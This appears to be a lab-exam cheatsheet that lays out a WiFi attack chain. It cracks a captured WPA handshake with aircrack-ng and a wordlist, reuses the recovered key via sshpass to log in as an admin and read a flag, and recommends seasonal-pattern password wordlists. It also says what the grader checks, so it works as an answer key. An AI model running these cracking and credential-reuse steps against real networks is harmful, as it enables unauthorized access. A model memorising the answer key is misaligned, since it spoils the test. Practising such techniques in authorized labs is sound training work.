# Cheatsheet — exam quick reference

## The full T1 chain

```bash
ssh wifi@<lab>                          # lab user per briefing
cat /opt/wifi/site-survey.txt           # authorized SSIDs
aircrack-ng /opt/wifi/exam-handshake.cap   # what network? handshake?
aircrack-ng -w /opt/wifi/wordlist.txt \
    /opt/wifi/exam-handshake.cap        # crack
```

## Reporting (grader greps BOTH)

```bash
cat > /home/wifi/analysis.txt <<'EOF'
network: backup-wifi
recovered-key: <PSK>
impact: admin account uses wireless PSK
EOF
```

## Then use it

```bash
sshpass -p '<PSK>' ssh backup-admin@localhost 'cat ~/flag.txt'
```

## Seasonal-pattern wordlists

Rotations often follow `<season><year>` / `<month><yy>` — a small custom
wordlist with 12 months + 4 seasons × 2-3 years covers most human schemes.
